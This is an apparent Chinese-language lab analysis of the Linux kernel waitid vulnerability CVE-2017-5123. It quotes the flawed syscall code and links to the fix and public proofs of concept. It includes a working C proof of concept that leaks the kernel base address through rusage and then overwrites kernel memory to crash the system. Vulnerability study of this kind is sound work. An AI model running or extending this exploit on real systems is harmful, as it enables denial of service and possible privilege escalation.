# CVE-2017-5123 的分析实验
## 简述
CVE-2017-5123 的利用实现包括两个环节：
1. waitid 调用 usercopy，泄漏内核的基址
2. waitid 调用 unsafe_put_user 没有调用 access_ok，会导致任意写

## waitid 问题代码
```  
SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
		infop, int, options, struct rusage __user *, ru)
{
	struct rusage r;
	struct waitid_info info = {.status = 0};
	long err = kernel_waitid(which, upid, &info, options, ru ? &r : NULL);
	int signo = 0;
	if (err > 0) {
		signo = SIGCHLD;
		err = 0;
	}

	/* infoleak 将 rusage 结构体复制到用户空间
	 * 用户空间在这个结构体里搜寻，获取指针并掩码就能得到内核基址
	 */
	if (!err) {
		if (ru && copy_to_user(ru, &r, sizeof(struct rusage)))
			return -EFAULT;
	}
	if (!infop)
		return err;

	/* 这里没有调用 access_ok 检查，导致任意内存写
	 * 注意，这里可以直接传递内核空间的指针
	 * 需要涂抹的地址可以透过偏移量加上内核基址得到	
	 */
	user_access_begin();
	unsafe_put_user(signo, &infop->si_signo, Efault);
	unsafe_put_user(0, &infop->si_errno, Efault);
	unsafe_put_user((short)info.cause, &infop->si_code, Efault);
	unsafe_put_user(info.pid, &infop->si_pid, Efault);
	unsafe_put_user(info.uid, &infop->si_uid, Efault);
	unsafe_put_user(info.status, &infop->si_status, Efault);
	user_access_end();
	return err;
Efault:
	user_access_end();
	return -EFAULT;
}

```  
下面是一下信息：
引入：https://git.kernel.org/linus/4c48abe91be03d191d0c20cc755877da2cb35622
修复：https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=96ca579a1ecc943b75beba58bebb0356f6cc4b51
关于 unsafe_put_user 的讨论：https://lwn.net/Articles/736348/
spender 的 infoleak poc：https://grsecurity.net/~spender/exploits/wait_for_kaslr_to_be_effective.c
up201407890 的 pochttp://seclists.org/oss-sec/2017/q4/134

## POC 简述
[完整版用主线 4.13 内核测试过]（CVE-2017-5123_poc.c)
```  
int main(void)
{
	int pid;
	struct rusage rusage = { };
	unsigned long *p, *crash;
	char *selinux_enforcing, *selinux_enabled;
	pid = fork();

	if (pid > 0) {
        /* 调用 waitid 获取 rusage */
        syscall(__NR_waitid, P_PID, pid, NULL, WEXITED|WNOHANG|__WNOTHREAD, &rusage);
		printf("Leak size=%d bytes\n", sizeof(rusage));
        	/* 搜寻泄漏的 rusage 内存块，寻找内核指针，算出内核基地址 */
		for (p = &rusage;
		     p < (unsigned long *)((char *)&rusage + sizeof(rusage));
		     p++) {
			if (*p > 0xffffffff00000000 && *p < 0xffffffffff000000) {
			  printf("Found kernel base=%p\n", (void*)(*p&0xffffffffff000000));
				break;
			}
		}

		printf("Crash start!\n");
        	/* 调用 waitid， 利用 waitid 未进行 access_to 就对传入指针进行写操作
         	 * 我们这里从算出的内核基址开始，盲目的去覆写内核内存导致 crash 
		 */
		for(crash = (siginfo_t*)*p;
		    crash <= 0xffffffffff000000;
		    crash++){
		  syscall(__NR_waitid, P_PID, pid, crash, WEXITED|WNOHANG|__WNOTHREAD, NULL);
		  printf("Overwrite kernel memory=%p\n", crash);
		}
		
		if(p < (unsigned long *)0xffffffff00000000 || p > (unsigned long *)0xffffffffff000000)
		  exit(-1);
       	} else if (pid == 0) {
		sleep(1);
		exit(0);
	}

	return 0;
}

```  

